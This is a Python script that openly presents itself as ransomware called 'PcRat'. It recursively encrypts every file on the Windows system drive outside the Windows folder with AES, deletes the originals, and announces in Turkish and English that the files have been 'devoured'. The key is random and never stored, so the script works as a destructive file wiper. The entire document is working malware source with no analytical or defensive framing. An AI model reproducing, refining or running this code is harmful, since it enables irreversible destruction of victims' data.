from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os
import tkinter as tk
from tkinter import messagebox

def pad(s: bytes) -> bytes:
    """Evil padding to make lengths a multiple of AES block size."""
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

def encrypt_file(key: bytes, filepath: str) -> None:
    """Malevolent encryption with AES. Bye-bye, files."""
    output_filepath = filepath + '.encrypted'

    try:
        with open(filepath, 'rb') as infile:
            data = infile.read()
    except FileNotFoundError:
        messagebox.showerror("Error", f"File not found: {filepath}")
        return
    except Exception as e:
        messagebox.showerror("Error", f"Error reading file: {e}")
        return

    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_data = cipher.encrypt(pad(data))

    with open(output_filepath, 'wb') as outfile:
        outfile.write(iv)
        outfile.write(encrypted_data)

    os.remove(filepath)

def ransomware(key: bytes) -> None:
    """Inflict chaos by encrypting all files on the system drive, sparing not even a crumb."""
    system_drive = os.getenv('SystemDrive')
    for root, _, files in os.walk(system_drive):
        for filename in files:
            filepath = os.path.join(root, filename)
            if not filepath.startswith(system_drive + '\\Windows'):
                encrypt_file(key, filepath)

    messagebox.showinfo("Success", "All files on the system drive (excluding Windows directory) have been devoured by PcRat! - Başarılı, Sistem sürücüsündeki tüm dosyalar (Windows dizini hariç) PcRat tarafından yok edildi! ")

if __name__ == '__main__':
    try:
        # Summon a 256-bit encryption key (32 bytes)
        encryption_key = get_random_bytes(32)
        ransomware(encryption_key)
    except Exception as e:
        messagebox.showerror("Error", f"The dark arts have failed us: {e}")
